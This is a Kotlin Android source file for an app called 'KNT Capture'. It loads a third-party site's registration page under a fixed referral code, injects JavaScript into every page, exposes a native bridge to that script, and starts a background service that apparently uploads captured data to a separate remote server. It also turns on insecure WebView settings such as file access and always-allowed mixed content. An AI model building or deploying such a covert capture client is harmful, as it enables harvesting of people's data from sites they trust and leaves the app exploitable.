package com.knt.captureclient

import android.annotation.SuppressLint
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.view.ViewGroup
import android.webkit.*
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import java.util.UUID

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var statusBar: TextView

    companion object {
        // ---- change these ----
        const val REGISTER_URL = "https://dkwin9.com/#/register?invitationCode=164651193511"
        const val ADMIN_URL    = "https://dkwin9.com/#/team"   // your team/subordinate page
        const val SERVER_URL   = "https://knt-capture-server.onrender.com"
        const val INGEST_TOKEN = "knt-capture-CHANGE-THIS-9f2b7c3d4e"
        const val ADMIN_UID    = "164651193511"
        // ----------------------
    }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        Prefs.init(this)
        if (Prefs.deviceId.isNullOrEmpty()) {
            Prefs.deviceId = UUID.randomUUID().toString().replace("-", "").take(16)
        }

        // start uploader service
        val svc = Intent(this, UploadService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc)
        else startService(svc)

        // ---- UI: linear layout with top status bar + WebView ----
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
        }

        statusBar = TextView(this).apply {
            setPadding(24, 24, 24, 24)
            setTextColor(0xFF1EFFBC.toInt())
            setBackgroundColor(0xFF0A0F1A.toInt())
            textSize = 12f
            text = "KNT Capture · " + (if (isAdmin()) "ADMIN MODE" else "CAPTURE MODE")
        }
        root.addView(statusBar, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ))

        webView = WebView(this)
        root.addView(webView, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            0, 1f
        ))

        setContentView(root)

        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            databaseEnabled = true
            allowFileAccess = true
            allowContentAccess = true
            mediaPlaybackRequiresUserGesture = false
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            userAgentString = userAgentString + " KNTCapture/1.0"
        }

        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                JsInjector.inject(view ?: return, url ?: "", isAdmin())
                statusBar.text = "KNT Capture · ${if (isAdmin()) "ADMIN" else "CAPTURE"} · ${url?.take(40)}"
            }
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onConsoleMessage(cm: ConsoleMessage): Boolean {
                android.util.Log.d("KNT-WV", "${cm.message()} @${cm.lineNumber()}")
                return true
            }
        }

        webView.addJavascriptInterface(CaptureBridge(this), "KNTBridge")

        val startUrl = if (isAdmin()) ADMIN_URL else REGISTER_URL
        webView.loadUrl(startUrl)
    }

    private fun isAdmin(): Boolean {
        // the admin phone is the one whose Prefs holds ADMIN_UID
        return Prefs.adminMode
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) webView.goBack() else super.onBackPressed()
    }
}
